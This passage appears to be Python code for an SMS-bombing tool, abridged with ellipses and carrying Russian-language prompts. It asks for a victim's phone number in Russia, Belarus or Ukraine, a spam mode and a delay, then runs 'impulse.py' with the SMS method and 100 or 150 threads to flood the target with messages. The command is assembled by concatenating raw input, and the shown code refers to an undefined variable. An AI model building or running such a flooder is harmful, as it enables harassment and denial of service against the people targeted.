...
def Bomb():
	while True:
		...
		if bomber == "1":
			while True:
				print("")
				print(colored("⟨Country⟩", "blue"))
				RU = colored("Russia", "red")
				BE = colored("Belarusian", "yellow")
				UK = colored("Ukraine", "green")
				print(imp, RU)
				print(bom, BE)
				print(dow, UK)
				print("")
				...
				print(colored("[0] Назад", "red"))
				print("")
				coun = input(colored(" —>> ", "red"))
				if coun == "1":
					print("")
					number = colored(input("Номер +7"))
					number = ("7" + number)
					print("")
					print(colored("⟨Выберите Режим спама⟩", "blue"))
					...
					if threads == "1":
						print("")
						print(colored("Начать спам сразу или через определённое время?\n0 Сразу \nИли укажите время в секундах", "yellow"))
						print("")
						times = input(colored("?: ", "red"))
						print("")
						...
						times = int(times)
						if times <= 0:
							os.system("cd % && python impulse.py --target " + number + " --method SMS --time " + time + " --threads 100")
						elif times > 0:
							print("")
							print(colored("Ожидайте...", "green"))
							print("")
						...
						times = int(times)
						if times <= 0:
							os.system("cd % && python impulse.py --target " + number + " --method SMS --time " + time + " --threads 150")
						elif times > 0:
							print("")
							print(colored("Ожидайте...", "green"))
							print("")
					...
					print("")
					number = colored(input("Номер +375"))
					number = ("375" + number)
					print("")
					print(colored("⟨Выберите Режим спама⟩", "blue"))
					easy = colored("Easy", "green")
					...
					print("")
					number = colored(input("Номер +380"))
					number = ("380" + number)
					print("")
					print(colored("⟨Выберите Режим спама⟩", "blue"))
					easy = colored("Easy", "green")
					...
					print("")
					print(colored("Выберите вариант...", "red"))
					print("")
		elif bomber == "2":
			print("")
